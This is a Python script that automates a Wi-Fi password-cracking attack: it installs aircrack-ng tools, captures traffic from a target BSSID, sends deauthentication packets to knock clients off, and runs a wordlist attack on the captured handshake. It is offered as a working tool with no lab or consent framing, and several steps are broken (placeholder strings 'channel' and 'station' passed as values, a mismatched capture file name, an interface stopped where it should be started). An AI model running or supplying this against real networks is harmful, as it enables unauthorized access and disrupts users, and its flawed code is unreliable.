import os
import subprocess
import sys
import platform
import requests

def download_file(url, filename):
    response = requests.get(url)
    with open(filename, 'wb') as f:
        f.write(response.content)

# Check the operating system
system = platform.system()

# Download and install necessary packages for the current operating system
if system == "Linux":
    print("Installing necessary packages for Linux...")
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "aircrack-ng", "macchanger"])
elif system == "Darwin":  # macOS
    print("Installing necessary packages for macOS...")
    subprocess.run(["brew", "update"])
    subprocess.run(["brew", "install", "aircrack-ng", "macchanger"])
elif system == "Windows":
    print("Installing necessary packages for Windows...")
    # Add instructions here for downloading and running packages on Windows
elif system == "Android":
    print("Installing necessary packages for Termux/Userland...")
    subprocess.run(["pkg", "update"])
    subprocess.run(["pkg", "install", "root-repo"])
    subprocess.run(["pkg", "install", "aircrack-ng", "macchanger"])

# Ask the user to input the path of the wordlist file
wordlist_file = input("Enter the path of the wordlist file: ")

# Check if the wordlist file exists
if not os.path.exists(wordlist_file):
    print(f"The file {wordlist_file} does not exist.")
    sys.exit(1)

# Continue with the rest of the program
print("Starting the first phase...")
subprocess.run(["airmon-ng"])
subprocess.run(["airmon-ng", "stop", "wlan0"])
subprocess.run(["airodump-ng", "wlan0"])

# Get the BSSID
bssid = input("Enter the BSSID: ")

# Continue the first phase
subprocess.run(["airodump-ng", "-c", "channel", "--write", "tuto", "--bssid", bssid, "wlan0"])

# Second phase
print("Starting the second phase...")
subprocess.run(["aireplay-ng", "--deauth", "50", "-a", bssid, "-c", "station", "wlan0"])
subprocess.run(["ls"])
subprocess.run(["aircrack-ng", "-w", wordlist_file, "-b", bssid, "file.cap"])

print("Program completed!")
